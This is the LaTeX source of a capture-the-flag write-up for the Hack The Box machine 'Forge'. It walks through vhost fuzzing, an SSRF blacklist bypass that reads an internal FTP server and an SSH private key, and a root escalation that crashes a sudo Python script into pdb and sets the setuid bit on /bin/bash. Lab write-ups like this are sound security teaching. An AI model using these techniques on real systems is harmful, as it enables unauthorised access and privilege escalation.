\end{wutable}

Basically you use a vulnerability in an upload function to read files from a locally bound web service. You are then able to follow the trace and extract a private key to login via ssh. Finally you exploit a script, which you are able to run as root and which drops you into a gdb shell on error. There you can gain a root session.

\section{nmap}

Nmap results will give you three ports:

\begin{compactitem}
	\ttfamily
\item 21/TCP, FTP, filtered
\item 22/TCP, SSH, open
\item 80/TCP, HTTP, open
\end{compactitem}

\section{Webapp port 80}
If you direct your browser to \url{http://10.10.11.111} you will be redirected to \url{http://forge.htb}. Therefore we are adding this host to our \texttt{/etc/hosts} file.

\wuimage[width=.5]{images/etc_hosts}{added forge.htb to /etc/hosts}

The website then shows us a \enquote{image gallery} and an \enquote{upload}-button in the top right corner.

\wuimage[]{images/website}{website on port 80 for forge.htb}

The upload dialog lets us upload either an image from disk or one from an url as can be seen from figure \vref{images/upload_image_button}.

\wuimage[width=.6]{images/upload_image_button}{Upload image page}

We can easily upload an image but a file like a command shell will be blocked.

Testing the \enquote{Upload from url} feature we can provoke a callback from the box to our attackers system:

\begin{wulisting}[caption=connection test]

\end{wulisting}

\section{Virtual host enumaration}
As this site at first did not give me anything else I decided to try and find other vhosts using \texttt{wfuzz}.

\begin{wulisting}[caption=wfuzz vhost enumeration]
> §BL[wfuzz -c -w ~/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://forge.htb' -H "Host: FUZZ.forge.htb" --hw 26]BL§

\end{wulisting}

Wfuzz is giving us the vhost admin. Therefore we add this to our \enquote{/etc/hosts}-file, too.

\section{Webapp port 80 - vhost admin}
Looking at this page with a browser one will discover, that this page can only be accessed from an internal source, as the following figure shows.

\wuimage[width=.5]{images/localhost_only}{Only localhost is allowed}

We need to use a vulnerability in the main web application to access the app at \url{http://admin.forge.htb} from an interal source.

But entering \texttt{http://admin.forge.htb} into the \enquote{Upload from url}-dialog will result in a blocked request due to a blacklist.

\wuimage[width=.8]{images/blacklist}{Blacklist is in place}

We can easily bypass the blacklist by entering \texttt{http://\bfhtbpurple{A}dmin.\bfhtbpurple{F}orge.htb} as an url.

If you look at this request other than in a browser (in my case I am using \texttt{Burp}) you are able to see the site as html markup. Within this response you can discover different other paths.

\begin{wulisting}[caption=paths leaking]
<!DOCTYPE html>
<html>
<head>
	<title>Admin Portal</title>
</head>
<body>
	<link rel="stylesheet" type="text/css" href="/static/css/main.css">
	<header>

		<h1 class=""><a href="/">Portal home</a></h1>
		<h1 class="align-right margin-right"><a href="§P[/announcements]P§">Announcements</a></h1>

	</header>
	<br><br><br><br>
	<br><br><br><br>
	<center><h1>Welcome Admins!</h1></center>
</body>
</html>
\end{wulisting}

Finally looking at \texttt{/announcments} we can discover credentials and some instructions:

\begin{wulisting}[caption=credentials and announcment]
An internal ftp server has been setup with credentials as §R[user:heightofsecurity123!]R§
The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.
The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<url>.
\end{wulisting}

\chapter{Foothold}
So next up the path is quite clear. We can access the internal \texttt{ftp} service, which was filtered in the nmap scan using the vulnerability in the main web application.

\section{Exploit path}

\begin{wulisting}[caption=POST request]
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0

§BL[url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb&remote=1]BL§
\end{wulisting}

You will receive an url where you can see the \enquote{uploaded image}. This url will reveal the information we requested.

There you can see the content of the internal bound ftp server:

\begin{wulisting}[caption=server reply]

\end{wulisting}

\section{Fetching user.txt}

This way we can also read the user.txt file directly requesting the url \url{http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb/user.txt}.

\begin{wulisting}[caption=reading the user.txt]

\end{wulisting}

\section{Gaining shell}

So as we are a ftp user called \texttt{user} in a home directory we could also try ssh in with the creds:

\begin{wulisting}[caption=trying ssh connection]
> §BL[ssh user@forge.htb]BL§
The authenticity of host 'forge.htb (10.10.11.111)' can't be established.
ED25519 key fingerprint is SHA256:ezqn5XF0Y3fAiyCDw46VNabU1GKFK0kgYALpeaUmr+o.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forge.htb' (ED25519) to the list of known hosts.
user@forge.htb: §R[Permission denied (publickey).]R§
\end{wulisting}

But as we discover we would need to have a private key to ssh into the box.

So, hidden folders will not be displayed in listing. Right? But we get lucky and can retrieve the private key of user nonetheless as a key exists at \enquote{.ssh/id\_rsa}.

\begin{wulisting}[caption=retrieving private key]

\end{wulisting}

Finally we can use this key to ssh into the box.

\chapter{Privilege Escalation}
First check is \texttt{sudo -l} and this will reveal we can run a python script as root.

\begin{wulisting}[caption=output of sudo -l]
user@forge:~$ §BL[sudo -l]BL§
Matching Defaults entries for user on forge:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
	§P[(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py]P§
\end{wulisting}

So lets check what the script will do:

\begin{wulisting}[language=python, caption=script we can run as root]
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(('127.0.0.1', port))
	sock.listen(1)
	print(f'Listening on localhost:{port}')
	(clientsock, addr) = sock.accept()
	clientsock.send(b'Enter the secret passsword: ')
	if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
	clientsock.send(b'Wrong password!\n')
	else:
	clientsock.send(b'Welcome admin!\n')
	while True:
		clientsock.send(b'\nWhat do you wanna do: \n')
		clientsock.send(b'[1] View processes\n')
		clientsock.send(b'[2] View free memory\n')
		clientsock.send(b'[3] View listening sockets\n')
		clientsock.send(b'[4] Quit\n')
		option = int(clientsock.recv(1024).strip())
		if option == 1:
		clientsock.send(subprocess.getoutput('ps aux').encode())
		elif option == 2:
		clientsock.send(subprocess.getoutput('df').encode())
		elif option == 3:
		clientsock.send(subprocess.getoutput('ss -lnt').encode())
		elif option == 4:
		clientsock.send(b'Bye\n')
		break
except Exception as e:
	print(e)
	pdb.post_mortem(e.__traceback__)
finally:
	quit()
\end{wulisting}

The last part of this script is quite interesting. We can see that the user gets to choose from a menu. Choices are 1 to 4. And there is also no default choice. So if one was to choose \enquote{a} for example we will crash the script and land in a pdb.post\_mortem shell. This could payout for us.

So we need to ssh sessions for this.

In the first ssh session we start the script like:

\begin{wulisting}[caption=ssh session 1 - start server]
user@forge:~$ §BL[sudo /usr/bin/python3 /opt/remote-manage.py]BL§
Listening on localhost:5959
\end{wulisting}

In a second session we trigger the bug connecting to the socket and choose \enquote{a} from the menu. The password we need to enter one can find in the script itself.

\begin{wulisting}[caption=ssh session 2 - connect to server]
user@forge:~$ §BL[nc localhost 5959]BL§
Enter the secret passsword: §BL[secretadminpassword]BL§
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
§BL[a]BL§
\end{wulisting}

After triggering we can look at our first session and have an interactive shell there.

\begin{wulisting}[caption=ssh session 1 - gdb shell]
invalid literal for int() with base 10: b'a'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) §BL[1+1]BL§

(Pdb) §BL[import os]BL§

(Pdb) §BL[os.system("chmod 4775 /bin/bash")]BL§
(Pdb) §BL[exit]BL§
\end{wulisting}

I chose to modify \enquote{/bin/bash} with a setuid bit to gain an interactive shell afterwards.

\begin{wulisting}[caption=grabbing root.txt]
user@forge:~$ §BL[/bin/bash -p]BL§
